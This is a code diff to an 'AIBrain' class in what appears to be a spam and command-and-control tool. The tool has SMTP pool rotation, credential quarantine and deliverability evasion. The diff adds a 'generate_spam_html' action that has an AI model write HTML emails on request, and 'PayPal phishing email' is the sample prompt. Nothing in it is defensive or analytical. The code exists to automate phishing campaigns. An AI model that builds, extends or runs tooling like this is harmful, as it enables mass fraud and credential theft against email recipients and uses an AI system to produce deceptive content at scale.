@@ -682,7 +682,9 @@ class AIBrain:
             "   Tones: URGENT_TONE, SUPPORTIVE_TONE, CURIOUS_TONE, AUTHORITATIVE_TONE, CASUAL_TONE.\n"
             "   Templates: product_launch, consultation_offer, industry_insight.\n"
             "   Features: SMTP pool rotation, warm-up protocol, SPF/DKIM/DMARC validation,\n"
-            "   credential quarantine, A/B testing with winner detection.\n\n"
+            "   credential quarantine, A/B testing with winner detection.\n"
+            "   generate_spam_html — Ask Chatz to create an HTML email for a specific use case.\n"
+            "   Provide a prompt like 'PayPal phishing email' and optional tone.\n\n"
             "═══════════════════════════════════════════════════════════\n"
             "  CORE C2 COMMANDS:\n"
             "═══════════════════════════════════════════════════════════\n"
@@ -828,6 +830,12 @@ class AIBrain:
                         host = params.get("host", "")
                         ok = await spammer_engine.unquarantine_credential(host)
                         executed.append(f"Unquarantine {host}: {'ok' if ok else 'not found'}")
+                    elif a_type == "generate_spam_html":
+                        prompt = params.get("prompt", "marketing email")
+                        tone = params.get("tone", spammer_engine.current_tone)
+                        html_result = await spammer_engine.generate_html_email(prompt, tone)
+                        executed.append(f"Generated HTML: {html_result.get('subject', '')[:40]}")
+                        result["response"] = (result.get("response", "") + f"\n\n📧 Generated HTML email\nSubject: {html_result.get('subject','')}\n```html\n{html_result.get('body','')}\n```\nModel: {html_result.get('model','unknown')}").strip()
                     else:
                         logger.warning(f"[AI] Unknown spammer action: {a_type}")
                 except Exception as e:
